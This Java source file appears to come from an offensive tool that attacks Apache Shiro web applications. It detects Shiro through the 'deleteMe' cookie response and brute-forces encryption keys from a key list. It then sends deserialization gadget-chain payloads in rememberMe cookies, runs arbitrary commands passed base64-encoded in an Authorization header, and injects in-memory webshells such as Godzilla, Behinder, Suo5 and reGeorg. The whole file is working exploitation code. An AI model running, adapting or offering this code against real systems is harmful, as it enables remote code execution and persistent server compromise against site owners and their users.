
package com.summersec.attack.core;

import cn.hutool.http.Method;
import com.summersec.attack.deser.frame.Shiro;
import com.summersec.attack.deser.payloads.ObjectPayload;
import com.summersec.attack.deser.plugins.servlet.MemBytes;
import com.summersec.attack.deser.plugins.keytest.KeyEcho;
import com.summersec.attack.deser.util.Gadgets;
import com.summersec.attack.entity.ControllersFactory;
import com.summersec.attack.UI.MainController;
import com.summersec.attack.utils.HttpUtil;
import com.summersec.attack.utils.Utils;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.Proxy;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javafx.collections.ObservableList;
import org.apache.commons.lang.StringUtils;
import org.apache.shiro.codec.Base64;

public class AttackService {
    public static Shiro shiro = new Shiro();
    public static int aesGcmCipherType = 0;
    public static Object principal = KeyEcho.getObject();
    public static String cwd = System.getProperty("user.dir");
    public String url;
    public String method;
    public String shiroKeyWord;
    public Integer timeout;
    public static String attackRememberMe = null;
    public static String gadget = null;
    public static String realShiroKey = null;
    public static Map<String, String> globalHeader = null;
    public static String postData = null;
    private final MainController mainController;
    public int flagCount = 0;

    public AttackService(String method, String url, String shiroKeyWord, String timeout, Map<String, String> globalHeader, String postData) {
        this.mainController = (MainController)ControllersFactory.controllers.get(MainController.class.getSimpleName());
        this.url = url;
        this.method = method;
        this.timeout = Integer.parseInt(timeout) * 1000;
        this.shiroKeyWord = shiroKeyWord;
        this.globalHeader = globalHeader;
        this.postData = postData;
    }

    public HashMap<String, String> getCombineHeaders(HashMap<String, String> header) {
        HashMap<String, String> combineHeaders = new HashMap();
        Set<String> keySet = globalHeader.keySet();
        if (keySet.size() != 0) {
            for (String key : keySet) {
                if (key.equals("Cookie")) {
                    header.replace("Cookie", globalHeader.get(key) + "; " + header.get(key));
                    combineHeaders.putAll(header);
                } else {
                    combineHeaders.putAll(header);
                    combineHeaders.put(key, globalHeader.get(key));
                }
            }
        } else {
            combineHeaders = header;
        }
        return combineHeaders;
    }

    public String headerHttpRequest(HashMap<String, String> header) {
        String result = null;
        HashMap combineHeaders = this.getCombineHeaders(header);
        Proxy proxy = (Proxy)MainController.currentProxy.get("proxy");
        try {
/*            result = cn.hutool.http.HttpUtil.createRequest(Method.valueOf(this.method),this.url).setProxy(proxy).headerMap(combineHeaders,true).setFollowRedirects(false).execute().toString();
            return result;*/
/*            if (result.contains("Host")){
                return result;
            }*/
            if (this.method.equals("GET")) {
                result = cn.hutool.http.HttpUtil.createRequest(Method.valueOf(this.method),this.url).setProxy(proxy).headerMap(combineHeaders,true).setFollowRedirects(false).execute().toString();

            } else {
//                result = HttpUtil.postHeaderByHttpRequest(this.url, "UTF-8", this.postData, combineHeaders, this.timeout);
//                result = bodyHttpRequest(combineHeaders, this.postData);
                result = HttpUtil.postHttpReuest(this.url, this.postData, "UTF-8", combineHeaders, "application/x-www-form-urlencoded", this.timeout);
                System.out.println(result);

            }
        } catch (Exception var5) {
            this.mainController.logTextArea.appendText(Utils.log(var5.getMessage()));
        }


        return result;
    }

    public String bodyHttpRequest(HashMap<String, String> header, String postString) {
        String result = "";
        HashMap combineHeaders = this.getCombineHeaders(header);
        Proxy proxy = (Proxy)MainController.currentProxy.get("proxy");
        try {

            if (postString.equals("")) {
                result = cn.hutool.http.HttpUtil.createRequest(Method.valueOf(this.method),this.url).setProxy(proxy).headerMap(combineHeaders,true).setFollowRedirects(false).execute().toString();
                if (result.contains("Host")){
                    return result;
                }
                result = HttpUtil.getHttpReuest(this.url, this.timeout, "UTF-8", combineHeaders);
            } else if (!result.contains("Host") | !this.method.equals("GET")) {
                result = HttpUtil.postHttpReuest(this.url, postString, "UTF-8", combineHeaders, "application/x-www-form-urlencoded", this.timeout);
            }
        } catch (Exception var6) {
            this.mainController.logTextArea.appendText(Utils.log(var6.getMessage()));
        }

        return result;
    }

    public List<String> getALLShiroKeys() {
        ArrayList shiroKeys = new ArrayList();

        try {
            List<String> array = new ArrayList(Arrays.asList(cwd, "data", "shiro_keys.txt"));
            File shiro_file = new File(StringUtils.join(array, File.separator));
            BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(shiro_file), "UTF-8"));

            try {
                String line;
                try {
                    while((line = br.readLine()) != null) {
                        shiroKeys.add(line);
                    }
                } catch (IOException var10) {
                    var10.printStackTrace();
                }
            } finally {
                if (br != null) {
                    br.close();
                }

            }
        } catch (Exception var12) {
            String message = var12.getMessage();
            System.out.println(message);
        }

        return shiroKeys;
    }

    public List<String> generateGadgetEcho(ObservableList gadgetItems, ObservableList echoesItems) {
        List<String> targets = new ArrayList();

        for(int i = 0; i < gadgetItems.size(); ++i) {
            for(int j = 0; j < echoesItems.size(); ++j) {
                System.out.println();
                System.out.println(echoesItems.get(j));
                targets.add(gadgetItems.get(i) + ":" + echoesItems.get(j));
            }
        }

        return targets;
    }

    public boolean gadgetCrack(String gadgetOpt, String echoOpt, String spcShiroKey) {
        boolean flag = false;

        try {
            String rememberMe = this.GadgetPayload(gadgetOpt, echoOpt, spcShiroKey);
            if (rememberMe != null) {
                HashMap header = new HashMap();
                header.put("Cookie", rememberMe + ";");
//                header.put("Host", "08fb41620aa4c498a1f2ef09bbc1183c");
                String result = this.headerHttpRequest(header);
                if (result.contains("Host")) {
                    this.mainController.logTextArea.appendText(Utils.log("[++] 发现构造链:" + gadgetOpt + "  回显方式: " + echoOpt));
                    this.mainController.logTextArea.appendText(Utils.log("[++] 请尝试进行功能区利用。"));
                    this.mainController.gadgetOpt.setValue(gadgetOpt);
                    this.mainController.echoOpt.setValue(echoOpt);
                    gadget = gadgetOpt;
                    attackRememberMe = rememberMe;
                    flag = true;
                } else {
                    this.mainController.logTextArea.appendText(Utils.log("[-] 测试:" + gadgetOpt + "  回显方式: " + echoOpt));
                }
            }
        } catch (Exception var8) {
            this.mainController.logTextArea.appendText(Utils.log(var8.getMessage()));
        }

        return flag;
    }

    public String GadgetPayload(String gadgetOpt, String echoOpt, String spcShiroKey) {
        String rememberMe = null;

        try {
            Class<? extends ObjectPayload> gadgetClazz = com.summersec.attack.deser.payloads.ObjectPayload.Utils.getPayloadClass(gadgetOpt);
            ObjectPayload<?> gadgetPayload = (ObjectPayload)gadgetClazz.newInstance();
            Object template = Gadgets.createTemplatesImpl(echoOpt);
            Object chainObject = gadgetPayload.getObject(template);
            rememberMe = shiro.sendpayload(chainObject, this.shiroKeyWord, spcShiroKey);
        } catch (Exception var9) {
            var9.printStackTrace();
            this.mainController.logTextArea.appendText(Utils.log(var9.getMessage()));
        }

        return rememberMe;
    }

    public void simpleKeyCrack(String shiroKey) {
        try {
            List<String> tempList = new ArrayList();
            tempList.add(shiroKey);
            if (flagCount ==1){
                this.keyTestTask(tempList);
            }
            else{
                this.keyTestTask2(tempList);}

        } catch (Exception var3) {
            this.mainController.logTextArea.appendText(Utils.log(var3.getMessage()));
        }

    }

    public void keysCrack() {
        try {
            List<String> shiroKeys = this.getALLShiroKeys();
            if (flagCount ==1){
                this.keyTestTask(shiroKeys);
            }
            else {
                //多个shiro场景的爆破key方式
                this.keyTestTask2(shiroKeys);
                this.mainController.logTextArea.appendText(Utils.log("[++] 含有多个shiro场景"));
            }
        } catch (Exception var2) {
            this.mainController.logTextArea.appendText(Utils.log(var2.getMessage()));
        }

    }

    public boolean checkIsShiro() {
        boolean flag = false;

        try {
            HashMap<String, String> header = new HashMap();
            header.put("Cookie", this.shiroKeyWord + "=yes");
            String result = this.headerHttpRequest(header);
//            System.out.println(result);
            flag = result.contains("=deleteMe");

//            if (!flag){
//                flag = result.contains(shiroKeyWord);
//                flag = true;
//            }
            if (flag) {
                this.mainController.logTextArea.appendText(Utils.log("[++] 存在shiro框架！"));
                flag = true;
                flagCount = countDeleteMe(result);


            } else {
//               再次确认shiro
                HashMap<String, String> header1 = new HashMap();
                header1.put("Cookie", this.shiroKeyWord + "=" + AttackService.getRandomString(10));
                String result1 = this.headerHttpRequest(header1);
                flag = result1.contains("=deleteMe");
//                if (!flag){
//                    result1.contains(shiroKeyWord);
//                    flag = true;
//                }
                if(flag){
                    this.mainController.logTextArea.appendText(Utils.log("[++] 存在shiro框架！"));
                    flag = true;
                    flagCount = countDeleteMe(result);

                }else {

                    this.mainController.logTextArea.appendText(Utils.log("[-] 未发现shiro框架！"));

                }
            }
        } catch (Exception var4) {
            if (var4.getMessage() != null) {
                this.mainController.logTextArea.appendText(Utils.log(var4.getMessage()));
            }
        }

        return flag;
    }

    public static String getRandomString(int length){
        String str="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        SecureRandom random= new SecureRandom();
        StringBuffer sb=new StringBuffer();
        for(int i=0;i<length;i++){
            int number=random.nextInt(62);
            sb.append(str.charAt(number));
        }
        return sb.toString();
    }
    //计算包含几个deleteMe
    public int countDeleteMe(String text){
        // 根据指定的字符构建正则
        Pattern pattern = Pattern.compile("deleteMe");
        // 构建字符串和正则的匹配
        Matcher matcher = pattern.matcher(text);
        int count = 0;
        // 循环依次往下匹配
        while (matcher.find()){ // 如果匹配,则数量+1
            count++;
        }
        return  count;

    }
    public void keyTestTask(final List<String> shiroKeys) {
        Thread thread = new Thread(new Runnable() {
            public void run() {
                try {
                    for(int i = 0; i < shiroKeys.size(); ++i) {
                        String shirokey = (String)shiroKeys.get(i);

                        try {
                            String rememberMe = AttackService.shiro.sendpayload(AttackService.principal, AttackService.this.shiroKeyWord, (String)shiroKeys.get(i));
                            HashMap<String, String> header = new HashMap();
                            header.put("Cookie", rememberMe);
                            String result = AttackService.this.headerHttpRequest(header);
                            Thread.sleep(100L);
                            if (result!=null &&!result.isEmpty()&&!result.contains("=deleteMe")) {
                                AttackService.this.mainController.logTextArea.appendText(Utils.log("[++] 找到key：" + shirokey));
                                AttackService.this.mainController.shiroKey.setText(shirokey);
                                AttackService.realShiroKey = shirokey;
                                break;
                            }

                            AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + shirokey));
                        } catch (Exception var6) {
                            AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + shirokey + " " + var6.getMessage()));
                        }

                    }
                    AttackService.this.mainController.logTextArea.appendText(Utils.log("[+] 爆破结束"));

                } catch (Exception var7) {
                    throw var7;
                }
            }
        });
        thread.start();
    }

    public void keyTestTask2(final List<String> shiroKeys) {
        Thread thread = new Thread(new Runnable() {
            public void run() {
                try {
                    for(int i = 0; i < shiroKeys.size(); ++i) {
                        String shirokey = (String)shiroKeys.get(i);

                        try {
                            String rememberMe = AttackService.shiro.sendpayload(AttackService.principal, AttackService.this.shiroKeyWord, (String)shiroKeys.get(i));
                            HashMap<String, String> header = new HashMap();
                            header.put("Cookie", rememberMe);
                            String result = AttackService.this.headerHttpRequest(header);
                            Thread.sleep(100L);
                            if (result!=null &&!result.isEmpty()&&countDeleteMe(result)<flagCount) {
                                AttackService.this.mainController.logTextArea.appendText(Utils.log("[++] 找到key：" + shirokey));
                                AttackService.this.mainController.shiroKey.setText(shirokey);
                                AttackService.realShiroKey = shirokey;
                                break;
                            }

                            AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + shirokey));
                        } catch (Exception var6) {
                            AttackService.this.mainController.logTextArea.appendText(Utils.log("[-] " + shirokey + " " + var6.getMessage()));
                        }

                    }
                    AttackService.this.mainController.logTextArea.appendText(Utils.log("[+] 爆破结束"));

                } catch (Exception var7) {
                    throw var7;
                }
            }
        });
        thread.start();
    }
    public void execCmdTask(String command) {
        HashMap<String, String> header = new HashMap();
        header.put("Cookie", attackRememberMe);
        String b64Command = Base64.encodeToString(command.getBytes(StandardCharsets.UTF_8));
        header.put("Authorization", "Basic "+b64Command);
        String responseText = this.bodyHttpRequest(header, "");
        String result = responseText.split("\\$\\$\\$")[1];
        if (!result.equals("")) {
            byte[] b64bytes = Base64.decode(result);

            try {
                String defaultEncode = Utils.guessEncoding(b64bytes);
                this.mainController.execOutputArea.appendText(new String(b64bytes, defaultEncode));
                this.mainController.execOutputArea.appendText("-----------------------------------------------------------------------"+ "\n");
            } catch (UnsupportedEncodingException var8) {
                this.mainController.execOutputArea.appendText(new String(b64bytes) + "\n");
            }
        } else {
            this.mainController.execOutputArea.appendText(Utils.log("命令已执行,返回为空"));
        }

    }

    public void injectMem(String memShellType, String shellPass, String shellPath) {
        String injectRememberMe = this.GadgetPayload(gadget, "InjectMemTool", realShiroKey);
        String randomHeader = getRandomString(8);
        if (injectRememberMe != null) {
            HashMap<String, String> header = new HashMap();
            header.put("Cookie", injectRememberMe);
            header.put("p", shellPass);
            header.put("path", shellPath);
            if (memShellType.equals("哥斯拉[Valve]") || memShellType.equals("冰蝎[Valve]") || memShellType.equals("Suo5[Valve]") || memShellType.equals("Suo5[Filter]") || memShellType.equals("Suo5[Servlet]") || memShellType.equals("哥斯拉[Listener]") || memShellType.equals("冰蝎[Listener]") || memShellType.equals("Suo5[Listener]")) {
                header.put("h", randomHeader);
            }

            try {
                String b64Bytecode = MemBytes.getBytes(memShellType);
                String postString = "user=" + b64Bytecode;
                String result = this.bodyHttpRequest(header, postString);
                if (result.contains("->|Success|<-")) {
                    String httpAddress = Utils.UrlToDomain(this.url);
                    this.mainController.InjOutputArea.appendText(Utils.log(memShellType + "  注入成功!"));
                    this.mainController.InjOutputArea.appendText(Utils.log("路径：" + httpAddress + shellPath));
                    if (!memShellType.equals("reGeorg[Servlet]") && !memShellType.contains("Suo5")) {
                        this.mainController.InjOutputArea.appendText(Utils.log("密码：" + shellPass));
                    }
                    if (memShellType.equals("哥斯拉[Valve]") || memShellType.equals("冰蝎[Valve]") || memShellType.equals("Suo5[Valve]") || memShellType.equals("Suo5[Filter]") || memShellType.equals("哥斯拉[Listener]") || memShellType.equals("Suo5[Servlet]") || memShellType.equals("冰蝎[Listener]") || memShellType.equals("Suo5[Listener]")) {
                        this.mainController.InjOutputArea.appendText(Utils.log("请求头：" + randomHeader + ": " + randomHeader));
                    }
                } else {
                    if (result.contains("->|") && result.contains("|<-")) {
                        this.mainController.InjOutputArea.appendText(Utils.log(result));
                    }

                    this.mainController.InjOutputArea.appendText(Utils.log("注入失败,请更换注入类型或者更换新路径"));
                }
            } catch (Exception var10) {
                this.mainController.InjOutputArea.appendText(Utils.log(var10.getMessage()));
            }

            this.mainController.InjOutputArea.appendText(Utils.log("-------------------------------------------------"));
        }

    }

    public static void main(String[] args) {
    }
}
